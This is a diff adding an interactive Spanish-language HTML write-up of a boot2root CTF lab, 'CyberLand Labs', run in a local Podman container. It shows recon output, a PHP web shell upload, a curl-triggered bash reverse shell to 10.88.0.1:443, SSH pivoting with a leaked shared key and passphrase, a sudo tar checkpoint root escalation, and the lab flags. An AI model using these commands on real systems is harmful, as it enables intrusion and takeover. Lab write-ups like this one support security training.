@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="es" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup Interactivo: CyberLand Labs</title>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+
+    <!-- Tailwind Config for Custom Colors/Fonts -->
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            50: '#f0fdfa',
+                            100: '#ccfbf1',
+                            500: '#14b8a6', // Teal principal
+                            700: '#0f766e',
+                            900: '#134e4a',
+                        },
+                        dark: {
+                            800: '#1e293b',
+                            900: '#0f172a',
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'ui-sans-serif', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'Segoe UI', 'Roboto', 'Helvetica Neue', 'Arial', 'sans-serif'],
+                        mono: ['Fira Code', 'ui-monospace', 'SFMono-Regular', 'Menlo', 'Monaco', 'Consolas', 'Liberation Mono', 'Courier New', 'monospace'],
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        /* CSS Requirements */
+        
+        /* <!-- Chosen Palette: Warm Neutrals & Teal -->
+        <!-- Application Structure Plan: Linear "Kill Chain" Dashboard. The app uses a sidebar for navigation through the attack phases, presenting the linear process of a CTF in an intuitive, step-by-step format. Interactive "terminals" are used instead of static code blocks to simulate the hacker experience and keep the user engaged. A central visual dashboard summarizes the attack vectors. -->
+        <!-- Visualization & Content Choices: 
+            - Goal: Inform on CTF Metadata -> Viz: Header Badges & Stats -> Interaction: Hover effects -> Justification: Quick overview of the challenge.
+            - Goal: Analyze Attack Distribution -> Viz: Chart.js Doughnut Chart -> Interaction: Hover tooltips -> Library: Chart.js. Justification: Shows where the most effort/complexity lies in the machine.
+            - Goal: Simulate Execution -> Viz: Interactive Terminal Blocks -> Interaction: "Run Command" buttons with simulated typing -> Justification: Active learning rather than passive reading of bash commands.
+            - Goal: Explain PrivEsc Path -> Viz: Interactive Tabbed Flowchart (HTML/CSS) -> Interaction: Clickable nodes for Alice -> Bob -> Root -> Justification: Breaks down complex pivoting into digestible steps.
+            - NO SVG/Mermaid used. Pure HTML/CSS/Canvas and Unicode icons. -->
+        <!-- CONFIRMATION: NO SVG graphics used. NO Mermaid JS used. -->
+        */
+
+        body {
+            background-color: #fafaf9; /* stone-50 - Light background strictly enforced */
+            color: #292524; /* stone-800 */
+        }
+
+        /* Mandatory Chart Container Styling */
+        .chart-container {
+            position: relative;
+            width: 100%;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            height: 300px;
+            max-height: 400px;
+        }
+        @media (min-width: 768px) {
+            .chart-container {
+                height: 350px;
+            }
+        }
+
+        /* Custom Scrollbar for Terminals */
+        .terminal-scroll::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        .terminal-scroll::-webkit-scrollbar-track {
+            background: #0f172a; 
+        }
+        .terminal-scroll::-webkit-scrollbar-thumb {
+            background: #334155; 
+            border-radius: 4px;
+        }
+        .terminal-scroll::-webkit-scrollbar-thumb:hover {
+            background: #475569; 
+        }
+
+        .typing-cursor::after {
+            content: '█';
+            animation: blink 1s step-start infinite;
+            color: #4ade80;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+
+        .tab-active {
+            background-color: #14b8a6;
+            color: white;
+            border-color: #14b8a6;
+        }
+        .tab-inactive {
+            background-color: #f5f5f4;
+            color: #57534e;
+            border-color: #e7e5e4;
+        }
+    </style>
+</head>
+<body class="antialiased flex h-screen overflow-hidden selection:bg-brand-500 selection:text-white">
+
+    <!-- Sidebar Navigation -->
+    <nav class="w-64 bg-white border-r border-stone-200 flex-shrink-0 h-full flex flex-col hidden md:flex z-10 shadow-sm relative">
+        <div class="p-6 border-b border-stone-100">
+            <h1 class="text-2xl font-bold tracking-tighter text-stone-800">CyberLand<span class="text-brand-500">Labs</span></h1>
+            <p class="text-xs font-mono text-stone-500 mt-1 mt-2">10.88.0.2 // CTF Writeup</p>
+        </div>
+        <div class="overflow-y-auto flex-1 p-4">
+            <ul class="space-y-2 font-medium text-sm text-stone-600" id="nav-menu">
+                <li><a href="#dashboard" class="nav-link block px-3 py-2 rounded-lg hover:bg-stone-100 transition-colors">📊 Dashboard</a></li>
+                <li><a href="#entorno" class="nav-link block px-3 py-2 rounded-lg hover:bg-stone-100 transition-colors">⚙️ 1. Entorno</a></li>
+                <li><a href="#recon" class="nav-link block px-3 py-2 rounded-lg hover:bg-stone-100 transition-colors">🔍 2. Reconocimiento</a></li>
+                <li><a href="#exploit" class="nav-link block px-3 py-2 rounded-lg hover:bg-stone-100 transition-colors">⚡ 3. Explotación Web</a></li>
+                <li><a href="#privesc" class="nav-link block px-3 py-2 rounded-lg hover:bg-stone-100 transition-colors">🔓 4. Escalada & Pivoting</a></li>
+                <li><a href="#root" class="nav-link block px-3 py-2 rounded-lg hover:bg-stone-100 transition-colors">🚩 5. Compromiso Total</a></li>
+            </ul>
+        </div>
+        <div class="p-4 border-t border-stone-200 text-xs text-stone-400 text-center">
+            Autor: InfoSec Analyst
+        </div>
+    </nav>
+
+    <!-- Main Content Area -->
+    <main class="flex-1 overflow-y-auto bg-[#fafaf9] h-full scroll-smooth" id="main-scroll">
+        
+        <div class="max-w-5xl mx-auto p-6 md:p-10 space-y-16 pb-32">
+
+            <!-- Section: Dashboard Overview -->
+            <section id="dashboard" class="scroll-mt-10">
+                <header class="mb-8">
+                    <div class="flex flex-wrap gap-2 mb-4">
+                        <span class="px-3 py-1 bg-stone-200 text-stone-700 text-xs font-bold rounded-full uppercase tracking-wide">#Boot2Root</span>
+                        <span class="px-3 py-1 bg-yellow-100 text-yellow-700 text-xs font-bold rounded-full uppercase tracking-wide">Dificultad: Media</span>
+                        <span class="px-3 py-1 bg-blue-100 text-blue-700 text-xs font-bold rounded-full uppercase tracking-wide">Podman / Local</span>
+                    </div>
+                    <h2 class="text-4xl md:text-5xl font-extrabold text-stone-900 tracking-tight mb-4">Reporte de Intrusión:<br>CyberLand Labs</h2>
+                    <p class="text-lg text-stone-600 leading-relaxed max-w-3xl">
+                        Este panel interactivo desglosa el proceso completo de compromiso de la máquina <b>CyberLand Labs</b>. 
+                        Explora la arquitectura de la intrusión, desde la identificación inicial del entorno en contenedores hasta la escalada de privilegios cruzando múltiples usuarios (Alice, Bob) para obtener acceso root.
+                    </p>
+                </header>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-8 items-center bg-white p-6 rounded-2xl shadow-sm border border-stone-200">
+                    <div>
+                        <h3 class="text-xl font-bold text-stone-800 mb-3">Resumen de Vectores de Ataque</h3>
+                        <p class="text-sm text-stone-600 mb-4">
+                            El gráfico ilustra la distribución técnica del ataque. La mayor complejidad residió en la fase de <b>Escalada de Privilegios</b>, requiriendo un análisis profundo de incidentes y pivoting lateral entre cuentas antes de la escalada vertical.
+                        </p>
+                        <ul class="space-y-2 text-sm text-stone-700">
+                            <li class="flex items-center gap-2"><span class="text-brand-500 text-lg">■</span> <b>Reconocimiento:</b> Escaneo de puertos y fuzzing.</li>
+                            <li class="flex items-center gap-2"><span class="text-blue-500 text-lg">■</span> <b>Explotación Web:</b> Carga arbitraria de archivos (RCE).</li>
+                            <li class="flex items-center gap-2"><span class="text-purple-500 text-lg">■</span> <b>Pivoting:</b> Fugas de información en logs de auditoría.</li>
+                            <li class="flex items-center gap-2"><span class="text-rose-500 text-lg">■</span> <b>Escalada:</b> Abuso de binarios Sudo (GTFOBins).</li>
+                        </ul>
+                    </div>
+                    <!-- Chart Container -->
+                    <div class="chart-container bg-stone-50 rounded-xl p-4 border border-stone-100 flex items-center justify-center">
+                        <canvas id="attackChart"></canvas>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Section: 1. Entorno -->
+            <section id="entorno" class="scroll-mt-10">
+                <div class="flex items-center gap-3 mb-4">
+                    <div class="w-10 h-10 rounded-full bg-stone-200 flex items-center justify-center text-xl">⚙️</div>
+                    <h2 class="text-3xl font-bold text-stone-800">1. Configuración del Entorno</h2>
+                </div>
+                <p class="text-stone-600 mb-6 text-lg">
+                    El primer paso crítico es preparar la infraestructura. La máquina objetivo se ejecuta de forma aislada mediante Podman. En esta sección interactiva, puedes simular los comandos ejecutados para iniciar el contenedor y descubrir su dirección IP asignada en la red local virtual.
+                </p>
+
+                <!-- Interactive Terminal Component -->
+                <div class="bg-dark-900 rounded-xl shadow-lg overflow-hidden border border-dark-800">
+                    <div class="bg-dark-800 px-4 py-2 flex items-center gap-2 border-b border-stone-700/50">
+                        <div class="w-3 h-3 rounded-full bg-rose-500"></div>
+                        <div class="w-3 h-3 rounded-full bg-amber-500"></div>
+                        <div class="w-3 h-3 rounded-full bg-emerald-500"></div>
+                        <span class="ml-2 text-xs text-stone-400 font-mono">user@parrot:~</span>
+                    </div>
+                    <div class="p-4 font-mono text-sm text-stone-300">
+                        <div class="flex gap-2 mb-2">
+                            <span class="text-brand-500 font-bold">┌─[user@parrot]─[~]</span>
+                        </div>
+                        <div class="flex items-center gap-2 mb-4">
+                            <span class="text-stone-400">└──╼ $</span>
+                            <select id="cmd-entorno" class="bg-dark-800 text-brand-100 border border-stone-600 rounded px-2 py-1 text-xs focus:outline-none focus:border-brand-500">
+                                <option value="ps">sudo podman ps -a</option>
+                                <option value="start">sudo podman start forgotten-portal</option>
+                                <option value="inspect">sudo podman inspect forgotten-portal | grep IP</option>
+                            </select>
+                            <button onclick="runTerminal('entorno')" class="px-3 py-1 bg-brand-600 hover:bg-brand-500 text-white rounded text-xs transition-colors shadow flex items-center gap-1">
+                                Ejecutar <span>&#9654;</span>
+                            </button>
+                        </div>
+                        <div id="output-entorno" class="min-h-[100px] text-green-400 whitespace-pre-wrap break-words terminal-scroll overflow-y-auto max-h-[300px]">
+                            <!-- Output will be injected here -->
+                            <span class="text-stone-500 italic">Selecciona un comando y presiona Ejecutar para interactuar con la terminal.</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Section: 2. Reconocimiento -->
+            <section id="recon" class="scroll-mt-10">
+                <div class="flex items-center gap-3 mb-4">
+                    <div class="w-10 h-10 rounded-full bg-blue-100 flex items-center justify-center text-xl">🔍</div>
+                    <h2 class="text-3xl font-bold text-stone-800">2. Fase de Reconocimiento</h2>
+                </div>
+                <p class="text-stone-600 mb-6 text-lg">
+                    Con la IP objetivo identificada (<code>10.88.0.2</code>), procedemos a mapear la superficie de ataque. Esta sección muestra los resultados del escaneo de puertos (Nmap) y el descubrimiento de directorios web (Feroxbuster), revelando las tecnologías subyacentes y rutas críticas como <code>/uploads/</code>.
+                </p>
+
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <!-- Nmap Results -->
+                    <div class="bg-white border border-stone-200 rounded-xl p-5 shadow-sm">
+                        <h4 class="font-bold text-stone-800 mb-3 flex justify-between items-center">
+                            <span>Mapeo de Red (Nmap)</span>
+                            <span class="text-xs bg-stone-100 px-2 py-1 rounded font-mono text-stone-500">nmap -sV -sC -p-</span>
+                        </h4>
+                        <div class="overflow-x-auto">
+                            <table class="w-full text-sm text-left text-stone-600">
+                                <thead class="text-xs text-stone-700 uppercase bg-stone-50 border-b border-stone-200">
+                                    <tr>
+                                        <th class="px-4 py-3">Puerto</th>
+                                        <th class="px-4 py-3">Estado</th>
+                                        <th class="px-4 py-3">Servicio / Versión</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr class="border-b border-stone-100">
+                                        <td class="px-4 py-3 font-mono font-bold text-brand-600">22/tcp</td>
+                                        <td class="px-4 py-3"><span class="px-2 py-1 bg-green-100 text-green-700 rounded text-xs">open</span></td>
+                                        <td class="px-4 py-3">OpenSSH 9.6p1 Ubuntu</td>
+                                    </tr>
+                                    <tr class="border-b border-stone-100 bg-stone-50">
+                                        <td class="px-4 py-3 font-mono font-bold text-brand-600">80/tcp</td>
+                                        <td class="px-4 py-3"><span class="px-2 py-1 bg-green-100 text-green-700 rounded text-xs">open</span></td>
+                                        <td class="px-4 py-3">Apache httpd 2.4.58<br><span class="text-xs text-stone-400">CyberLand Labs</span></td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+
+                    <!-- Web Fuzzing -->
+                    <div class="bg-dark-900 rounded-xl shadow-lg border border-dark-800 flex flex-col">
+                         <div class="bg-dark-800 px-4 py-2 border-b border-stone-700/50 flex justify-between items-center">
+                            <span class="text-xs text-stone-400 font-mono">Fuzzing Web (Feroxbuster)</span>
+                            <button onclick="simulateFuzzing()" class="text-xs px-2 py-1 bg-stone-700 hover:bg-stone-600 text-white rounded">Escanear Rutas</button>
+                        </div>
+                        <div class="p-4 font-mono text-xs text-stone-300 flex-1 overflow-y-auto max-h-[250px] terminal-scroll" id="fuzzing-output">
+                            <div class="text-stone-500 italic">Esperando inicialización del ataque de diccionario...</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Section: 3. Explotación Web -->
+            <section id="exploit" class="scroll-mt-10">
+                <div class="flex items-center gap-3 mb-4">
+                    <div class="w-10 h-10 rounded-full bg-rose-100 flex items-center justify-center text-xl">⚡</div>
+                    <h2 class="text-3xl font-bold text-stone-800">3. Explotación Web (RCE)</h2>
+                </div>
+                <p class="text-stone-600 mb-6 text-lg">
+                    Tras descubrir que la ruta <code>/uploads/</code> permite la ejecución de código (Directory Listing y ejecución PHP), el objetivo es lograr Ejecución Remota de Comandos (RCE). Aquí documentamos la creación del payload, la verificación mediante `curl` y la estabilización vital de la consola (TTY) tras recibir la reverse shell.
+                </p>
+
+                <!-- Interactive Exploit Steps -->
+                <div class="bg-white rounded-xl shadow-sm border border-stone-200 overflow-hidden">
+                    <div class="flex border-b border-stone-200 bg-stone-50 overflow-x-auto">
+                        <button onclick="switchTab('exploit', 'step1')" id="tab-step1" class="px-6 py-3 text-sm font-bold tab-active whitespace-nowrap transition-colors border-b-2">1. Payload PHP</button>
+                        <button onclick="switchTab('exploit', 'step2')" id="tab-step2" class="px-6 py-3 text-sm font-bold tab-inactive whitespace-nowrap transition-colors border-b-2">2. Reverse Shell</button>
+                        <button onclick="switchTab('exploit', 'step3')" id="tab-step3" class="px-6 py-3 text-sm font-bold tab-inactive whitespace-nowrap transition-colors border-b-2">3. Estabilizar TTY</button>
+                    </div>
+                    
+                    <div class="p-6 bg-dark-900 font-mono text-sm">
+                        <!-- Step 1 Content -->
+                        <div id="content-step1" class="text-stone-300">
+                            <p class="text-brand-400 mb-2"># Creamos una web shell simple y la subimos al servidor:</p>
+                            <code class="block bg-black/30 p-3 rounded mb-4">echo '&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php</code>
+                            <p class="text-brand-400 mb-2"># Validamos la ejecución remota de comandos comprobando nuestro usuario:</p>
+                            <code class="block bg-black/30 p-3 rounded text-green-400">
+                                $ curl "http://10.88.0.2/uploads/shell.php?cmd=id"<br>
+                                uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                            </code>
+                        </div>
+                        
+                        <!-- Step 2 Content -->
+                        <div id="content-step2" class="text-stone-300 hidden">
+                            <p class="text-brand-400 mb-2"># En la Terminal 2 (Listener), ponemos el puerto en escucha:</p>
+                            <code class="block bg-black/30 p-3 rounded mb-4">sudo nc -lvnp 443</code>
+                            <p class="text-brand-400 mb-2"># En la Terminal 3, inyectamos el comando 'bash' reverse (Curl de Oro):</p>
+                            <code class="block bg-black/30 p-3 rounded text-green-400 break-all">
+                                curl "http://10.88.0.2/uploads/shell.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.88.0.1/443%200%3E%261'"
+                            </code>
+                        </div>
+
+                        <!-- Step 3 Content -->
+                        <div id="content-step3" class="text-stone-300 hidden">
+                            <p class="text-brand-400 mb-2"># Una vez recibida la conexión, la shell es inestable. Aplicamos el tratamiento de la TTY:</p>
+                            <code class="block bg-black/30 p-4 rounded text-green-400 leading-loose">
+                                www-data@60393dfbd77e:/$ <span class="text-white">script /dev/null -c bash</span><br>
+                                Script started, output log file is '/dev/null'.<br>
+                                <span class="text-stone-500"># Presionamos Ctrl+Z para mandarlo a segundo plano</span><br>
+                                [1]+  Stopped  sudo nc -lvnp 443<br>
+                                ┌─[user@parrot]─[~]<br>
+                                └──╼ $<span class="text-white">stty raw -echo; fg</span><br>
+                                <span class="text-white">reset xterm</span><br>
+                                <span class="text-white">export TERM=xterm</span><br>
+                                <span class="text-white">export SHELL=bash</span><br>
+                                <span class="text-white">stty rows 38 columns 168</span>
+                            </code>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Section: 4. Escalada & Pivoting -->
+            <section id="privesc" class="scroll-mt-10">
+                <div class="flex items-center gap-3 mb-4">
+                    <div class="w-10 h-10 rounded-full bg-purple-100 flex items-center justify-center text-xl">🔓</div>
+                    <h2 class="text-3xl font-bold text-stone-800">4. Pivoting y Auditoría</h2>
+                </div>
+                <p class="text-stone-600 mb-6 text-lg">
+                    El acceso inicial nos da el usuario <code>www-data</code>. Esta sección interactiva visualiza el movimiento lateral requerido. Explora los nodos a continuación para descubrir cómo la revisión de un reporte de incidentes expuso contraseñas y claves SSH mal configuradas, permitiendo saltar a usuarios con mayores privilegios.
+                </p>
+
+                <!-- Pivoting Flow Chart Builder (HTML/CSS) -->
+                <div class="bg-white p-6 rounded-xl shadow-sm border border-stone-200">
+                    <div class="flex flex-col md:flex-row items-center justify-center gap-4 mb-8">
+                        <!-- Node 1 -->
+                        <button onclick="showPivotingDetail('alice')" class="flex flex-col items-center group focus:outline-none">
+                            <div id="node-alice" class="w-20 h-20 rounded-2xl bg-stone-800 text-white flex flex-col items-center justify-center shadow-md transition-all ring-4 ring-transparent hover:ring-brand-300">
+                                <span class="text-2xl mb-1">👤</span>
+                                <span class="text-xs font-bold font-mono">Alice</span>
+                            </div>
+                        </button>
+                        
+                        <div class="text-stone-300 hidden md:block text-2xl animate-pulse">➾</div>
+                        <div class="text-stone-300 md:hidden text-2xl animate-pulse transform rotate-90">➾</div>
+
+                        <!-- Node 2 -->
+                        <button onclick="showPivotingDetail('report')" class="flex flex-col items-center group focus:outline-none">
+                            <div id="node-report" class="w-20 h-20 rounded-full bg-rose-100 text-rose-600 flex flex-col items-center justify-center shadow-md border-2 border-rose-300 transition-all ring-4 ring-transparent hover:ring-rose-200">
+                                <span class="text-2xl mb-1">📄</span>
+                                <span class="text-[10px] font-bold leading-tight text-center">Incident<br>Report</span>
+                            </div>
+                        </button>
+
+                        <div class="text-stone-300 hidden md:block text-2xl animate-pulse">➾</div>
+                        <div class="text-stone-300 md:hidden text-2xl animate-pulse transform rotate-90">➾</div>
+
+                        <!-- Node 3 -->
+                        <button onclick="showPivotingDetail('bob')" class="flex flex-col items-center group focus:outline-none">
+                            <div id="node-bob" class="w-20 h-20 rounded-2xl bg-brand-600 text-white flex flex-col items-center justify-center shadow-md transition-all ring-4 ring-transparent hover:ring-brand-300">
+                                <span class="text-2xl mb-1">🔑</span>
+                                <span class="text-xs font-bold font-mono">Bob</span>
+                            </div>
+                        </button>
+                    </div>
+
+                    <!-- Dynamic Detail Panel -->
+                    <div id="pivoting-detail" class="bg-stone-50 border border-stone-200 rounded-lg p-5 font-mono text-sm relative">
+                        <div class="absolute -top-3 left-1/2 transform -translate-x-1/2 w-4 h-4 bg-stone-50 border-t border-l border-stone-200 rotate-45"></div>
+                        <div id="pivoting-content" class="text-stone-700">
+                            Haz clic en los nodos de arriba para explorar el flujo de enumeración de privilegios y recolección de credenciales.
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Section: 5. Compromiso Total -->
+            <section id="root" class="scroll-mt-10">
+                <div class="flex items-center gap-3 mb-4">
+                    <div class="w-10 h-10 rounded-full bg-red-100 flex items-center justify-center text-xl">🚩</div>
+                    <h2 class="text-3xl font-bold text-stone-800">5. Compromiso Total (Root)</h2>
+                </div>
+                <p class="text-stone-600 mb-6 text-lg">
+                    Con acceso como el usuario <code>bob</code>, verificamos sus permisos en el sistema operativo. El descubrimiento de la capacidad para ejecutar el binario <code>tar</code> como superusuario (Sudo) sin contraseña nos otorga el vector final. Interactúa con el terminal inferior para ejecutar el exploit (GTFOBins) y capturar la flag final.
+                </p>
+
+                <div class="bg-dark-900 rounded-xl shadow-lg border border-dark-800 mt-6 relative overflow-hidden">
+                    <div class="bg-stone-800 text-stone-300 text-xs px-4 py-2 flex justify-between">
+                        <span>Terminal - Escalada Root</span>
+                        <span class="text-brand-400">sudo -l</span>
+                    </div>
+                    <div class="p-6 font-mono text-sm text-stone-300">
+                        <div class="mb-4">
+                            <span class="text-stone-400">┌─[bob@cyberland]─[~]</span><br>
+                            <span class="text-stone-400">└──╼ $</span> sudo -l<br>
+                            <span class="text-yellow-200 mt-2 block">(ALL) NOPASSWD: /bin/tar</span>
+                        </div>
+                        
+                        <div class="mb-6">
+                            <span class="text-stone-400">┌─[bob@cyberland]─[~]</span><br>
+                            <span class="text-stone-400">└──╼ $</span> 
+                            <span class="text-brand-300">sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash</span>
+                        </div>
+
+                        <!-- Interactive Exploit Execution -->
+                        <div id="root-execution-zone" class="mt-8 text-center border-t border-stone-700 pt-6">
+                            <button onclick="executeRootExploit()" id="btn-root" class="bg-rose-600 hover:bg-rose-500 text-white font-bold py-3 px-8 rounded-lg shadow-lg hover:shadow-rose-500/30 transition-all transform hover:scale-105 inline-flex items-center gap-2">
+                                <span class="text-xl">☢️</span> Ejecutar Exploit Checkpoint
+                            </button>
+                            
+                            <div id="root-success" class="hidden mt-6 text-left bg-black/50 p-6 rounded-xl border border-rose-500/50">
+                                <span class="text-stone-400">┌─[root@cyberland]─[/]</span><br>
+                                <span class="text-stone-400">└──╼ #</span> whoami<br>
+                                <span class="text-rose-400 font-bold text-xl typing-cursor">root</span>
+                                
+                                <div class="mt-4 pt-4 border-t border-stone-700/50">
+                                    <span class="text-stone-400">┌─[root@cyberland]─[/]</span><br>
+                                    <span class="text-stone-400">└──╼ #</span> cat root.txt<br>
+                                    <div class="mt-2 text-yellow-400 font-black text-2xl animate-pulse">CYBERLAND{m4st3r_0f_th3_p0rt4l}</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+        </div>
+    </main>
+
+    <!-- Interactive JavaScript Logic -->
+    <script>
+        // --- Navigation Logic ---
+        const navLinks = document.querySelectorAll('.nav-link');
+        const mainScroll = document.getElementById('main-scroll');
+        const sections = document.querySelectorAll('section');
+
+        mainScroll.addEventListener('scroll', () => {
+            let current = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                if (mainScroll.scrollTop >= sectionTop - 60) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            navLinks.forEach(link => {
+                link.classList.remove('bg-brand-50', 'text-brand-700', 'font-bold');
+                link.classList.add('text-stone-600', 'font-medium');
+                if (link.getAttribute('href').includes(current)) {
+                    link.classList.add('bg-brand-50', 'text-brand-700', 'font-bold');
+                    link.classList.remove('text-stone-600', 'font-medium');
+                }
+            });
+        });
+
+        // --- Chart.js Data & Initialization ---
+        document.addEventListener('DOMContentLoaded', function() {
+            const ctx = document.getElementById('attackChart').getContext('2d');
+            new Chart(ctx, {
+                type: 'doughnut',
+                data: {
+                    labels: ['Reconocimiento', 'Explotación Web', 'Análisis/Pivoting', 'Escalada de Privilegios'],
+                    datasets: [{
+                        data: [15, 25, 40, 20], // Qualitative estimation based on CTF steps
+                        backgroundColor: [
+                            '#14b8a6', // Teal
+                            '#3b82f6', // Blue
+                            '#a855f7', // Purple
+                            '#f43f5e'  // Rose
+                        ],
+                        borderWidth: 0,
+                        hoverOffset: 10
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false, // Essential for Tailwind container control
+                    cutout: '70%',
+                    plugins: {
+                        legend: {
+                            display: false // Handled in custom HTML list for better styling
+                        },
+                        tooltip: {
+                            callbacks: {
+                                label: function(context) {
+                                    return ' ' + context.label + ': ' + context.parsed + '% Esfuerzo/Complejidad';
+                                }
+                            },
+                            backgroundColor: '#1e293b',
+                            titleFont: { family: 'Inter', size: 14 },
+                            bodyFont: { family: 'Inter', size: 13 },
+                            padding: 12,
+                            cornerRadius: 8
+                        }
+                    }
+                }
+            });
+        });
+
+        // --- Terminal Data (Entorno) ---
+        const terminalOutputs = {
+            'ps': "CONTAINER ID  IMAGE                              COMMAND               CREATED        STATUS                  PORTS                 NAMES\n60393dfbd77e  localhost/forgotten_portal:latest  /bin/sh -c servic...  13 hours ago   Exited (0)             0.0.0.0:22->22/tcp... forgotten-portal",
+            'start': "forgotten-portal\n<span class='text-stone-500'># Contenedor iniciado exitosamente.</span>",
+            'inspect': "\"IPAddress\": \"10.88.0.2\",\n\"IPAddress\": \"10.88.0.2\""
+        };
+
+        function runTerminal(section) {
+            if(section === 'entorno') {
+                const cmd = document.getElementById('cmd-entorno').value;
+                const outDiv = document.getElementById('output-entorno');
+                outDiv.innerHTML = ''; // Clear
+                
+                // Simulate typing
+                outDiv.innerHTML = '<span class="typing-cursor"></span>';
+                setTimeout(() => {
+                    outDiv.innerHTML = terminalOutputs[cmd] + '<br><span class="typing-cursor"></span>';
+                }, 400);
+            }
+        }
+
+        // --- Fuzzing Simulator ---
+        function simulateFuzzing() {
+            const outDiv = document.getElementById('fuzzing-output');
+            outDiv.innerHTML = '';
+            const lines = [
+                "200      GET       39l       81w     1327c http://10.88.0.2/team.html",
+                "200      GET       29l       67w      931c http://10.88.0.2/blog.html",
+                "301      GET        9l       28w      308c http://10.88.0.2/uploads => http://10.88.0.2/uploads/",
+                "<span class='text-yellow-400'>[!] Directorio /uploads/ tiene el listado habilitado.</span>",
+                "200      GET       65l      221w     3010c http://10.88.0.2/index.html",
+                "200      GET       44l      152w     1749c http://10.88.0.2/script.js"
+            ];
+            
+            let i = 0;
+            function typeLine() {
+                if (i < lines.length) {
+                    outDiv.innerHTML += lines[i] + '<br>';
+                    outDiv.scrollTop = outDiv.scrollHeight; // Auto-scroll
+                    i++;
+                    setTimeout(typeLine, 300); // 300ms delay per line
+                } else {
+                    outDiv.innerHTML += '<br><span class="text-brand-500 font-bold">Escaneo completado.</span>';
+                }
+            }
+            typeLine();
+        }
+
+        // --- Tabs Logic (Exploitation) ---
+        function switchTab(section, targetStep) {
+            const steps = ['step1', 'step2', 'step3'];
+            steps.forEach(step => {
+                // Update Buttons
+                const btn = document.getElementById(`tab-${step}`);
+                if (step === targetStep) {
+                    btn.classList.remove('tab-inactive');
+                    btn.classList.add('tab-active');
+                } else {
+                    btn.classList.add('tab-inactive');
+                    btn.classList.remove('tab-active');
+                }
+                
+                // Update Content Visibility
+                const content = document.getElementById(`content-${step}`);
+                if (step === targetStep) {
+                    content.classList.remove('hidden');
+                } else {
+                    content.classList.add('hidden');
+                }
+            });
+        }
+
+        // --- Pivoting Detail Logic ---
+        const pivotingData = {
+            'alice': "<strong>Usuario inicial Alice:</strong><br>Enumeramos el home y localizamos la flag inicial: <code class='bg-stone-200 text-rose-600 px-1 rounded'>CYBERLAND{us3r_l3v3l_fl4g}</code>. Notamos un directorio inusual llamado <code>incidents/</code>.",
+            'report': "<strong>Análisis del Reporte de Incidentes:</strong><br>Al leer <code>/home/alice/incidents/report.txt</code>, descubrimos una negligencia grave de IT. El sistema de auditoría automatizada generó una única clave <code>id_rsa</code> compartida para todos los usuarios. Además, expone explícitamente la Passphrase del usuario Bob: <code class='bg-stone-200 text-brand-700 px-1 rounded'>cyb3r_s3curity</code>.",
+            'bob': "<strong>Pivoting Exitoso a Bob:</strong><br>Sabiendo que la clave RSA es compartida, extraemos <code>/home/alice/.ssh/id_rsa</code>. La guardamos en local, aplicamos <code>chmod 600</code> y nos conectamos vía SSH como Bob usando la passphrase comprometida. Esto nos acerca a la escalada de privilegios."
+        };
+
+        function showPivotingDetail(nodeId) {
+            const detailDiv = document.getElementById('pivoting-content');
+            
+            // Reset node highlights
+            ['alice', 'report', 'bob'].forEach(id => {
+               document.getElementById(`node-${id}`).classList.remove('ring-brand-500', 'ring-rose-500'); 
+            });
+
+            // Set new highlight based on node type
+            const colorClass = nodeId === 'report' ? 'ring-rose-500' : 'ring-brand-500';
+            document.getElementById(`node-${nodeId}`).classList.add(colorClass);
+
+            // Update text with a slight fade effect
+            detailDiv.style.opacity = 0;
+            setTimeout(() => {
+                detailDiv.innerHTML = pivotingData[nodeId];
+                detailDiv.style.opacity = 1;
+            }, 150);
+            detailDiv.style.transition = 'opacity 0.2s';
+        }
+
+        // --- Final Root Exploit Logic ---
+        function executeRootExploit() {
+            const btn = document.getElementById('btn-root');
+            const successDiv = document.getElementById('root-success');
+            
+            btn.innerHTML = 'Explotando Checkpoint...';
+            btn.classList.add('animate-pulse', 'bg-stone-600');
+            btn.classList.remove('bg-rose-600', 'hover:bg-rose-500');
+            btn.disabled = true;
+
+            setTimeout(() => {
+                btn.style.display = 'none';
+                successDiv.classList.remove('hidden');
+                successDiv.classList.add('animate-fade-in');
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
